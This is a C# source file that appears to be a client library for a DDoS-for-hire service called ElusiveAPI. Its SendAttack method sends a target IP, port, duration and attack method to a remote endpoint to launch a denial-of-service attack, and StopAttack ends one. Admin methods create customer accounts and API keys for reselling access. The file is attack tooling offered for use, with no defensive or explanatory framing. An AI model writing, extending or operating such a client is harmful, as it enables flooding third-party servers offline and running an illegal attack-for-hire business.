using System;
using Newtonsoft.Json;

namespace ElusiveAPI
{
    public class API : modules.vars
    {
        public bool SendAttack(string ip, int port, int time, string method)
        {
            string api_key = get_api_key();

            if (api_key == null)
            {
                throw new Exception("Attempt to call api before initializing an API key");
            }

            string endpoint = "/api/server.php?";
            string url = get_server() + endpoint + $"API_KEY={api_key}&ip={ip}&port={port}&time={time}&method={method}";

            string response = modules.requests.call_api(url, "GET");
            if (response.Contains("Success"))
            {
                return true;
            }
            return false;
        }
        public bool StopAttack(string ip)
        {
            string api_key = get_api_key();

            if (api_key == null)
            {
                throw new Exception("Attempt to call api before initializing an API key");
            }

            string endpoint = "/api/stop.php?";
            string url = get_server() + endpoint + $"key={api_key}&ip={ip}";

            string response = modules.requests.call_api(url, "GET");

            if (response.Contains("Success"))
            {
                return true;
            }
            return false;
        }
        public string[] create_account(string username)
        {
            string admin_key = get_admin_key();

            if(admin_key == null)
            {
                throw new Exception("Attempt to call an administrator only endpoint without initializing an Administrator Key");
            }

            string endpoint = "/api/admin/add.php";
            string post_data = $"key={admin_key}&action=usr-add&uname={username}";

            string response = modules.requests.call_api(get_server() + endpoint, "POST", post_data);

            try
            {
                dynamic deserializedJson = JsonConvert.DeserializeObject(response);

                string user = deserializedJson["Username"].ToString();
                string password = deserializedJson["Password"].ToString();

                return new string[]
                {
                    user,
                    password
                };
            }
            catch
            {
                throw new Exception("Failure creating account, Check your Administrator api keys & server.");
                return new string[] { "Failure creating account" };
            }
            return new string[] { "Unknown error creating account" };
        }
        public string GenerateAPIKey()
        {
            string admin_key = get_admin_key();

            if (admin_key == null)
            {
                throw new Exception("Attempt to call an administrator only endpoint without initializing an Administrator Key");
            }

            string endpoint = "/api/admin/add.php";
            string post_data = $"key={admin_key}&action=api-key";

            string response = modules.requests.call_api(get_server() + endpoint, "POST", post_data);

            try
            {
                dynamic deserializedJson = JsonConvert.DeserializeObject(response);

                string api_key = deserializedJson["ApiKey"];
                return api_key;

            }
            catch
            {
                throw new Exception("Failure creating API Key, Check your Administrator api keys & server.");
                return "Failure creating API Key";
            }
            return "Unknown error creating API Key";
        }
    }
}
